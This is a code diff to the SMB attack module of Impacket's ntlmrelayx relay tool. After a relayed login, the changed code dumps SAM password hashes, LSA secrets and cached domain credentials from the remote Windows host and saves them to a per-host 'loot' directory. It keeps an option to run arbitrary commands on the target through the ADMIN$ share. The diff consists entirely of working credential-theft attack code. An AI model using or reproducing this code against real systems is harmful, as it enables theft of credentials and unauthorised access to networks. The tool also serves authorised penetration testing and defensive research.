@@ -1,6 +1,6 @@
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
+# Copyright (C) 2022 Fortra. All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -14,6 +14,8 @@
 #   Alberto Solino (@agsolino)
 #   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
 #
+import os
+
 from impacket import LOG
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
 from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
@@ -65,7 +67,7 @@ class SMBAttack(ProtocolAttack):
                 LOG.info("Service Installed.. CONNECT!")
                 self.installService.uninstall()
         else:
-            from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+            from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
             from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins
             samHashes = None
             try:
@@ -96,20 +98,31 @@ class SMBAttack(ProtocolAttack):
                 return
 
             try:
+                remote_host = self.__SMBConnection.getRemoteHost()
                 if self.config.command is not None:
                     remoteOps._RemoteOperations__executeRemote(self.config.command)
-                    LOG.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
+                    LOG.info("Executed specified command on host: %s", remote_host)
                     self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                     self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
                     print(self.__answerTMP.decode(self.config.encoding, 'replace'))
                 else:
+                    if not os.path.exists(self.config.lootdir):
+                        os.makedirs(self.config.lootdir)
+                    outfile = os.path.join(self.config.lootdir, remote_host)
                     bootKey = remoteOps.getBootKey()
                     remoteOps._RemoteOperations__serviceDeleted = True
                     samFileName = remoteOps.saveSAM()
                     samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
                     samHashes.dump()
-                    samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
-                    LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                    samHashes.export(outfile)
+                    LOG.info("Done dumping SAM hashes for host: %s", remote_host)
+                    SECURITYFileName = remoteOps.saveSECURITY()
+                    LSASecrets = LSASecrets(SECURITYFileName, bootKey, remoteOps=remoteOps, isRemote= True, history=False)
+                    LSASecrets.dumpCachedHashes()
+                    LSASecrets.exportCached(outfile)
+                    LSASecrets.dumpSecrets()
+                    LSASecrets.exportSecrets(outfile)
+                    LOG.info("Done dumping LSA hashes for host: %s", remote_host)
             except Exception as e:
                 LOG.error(str(e))
             finally:
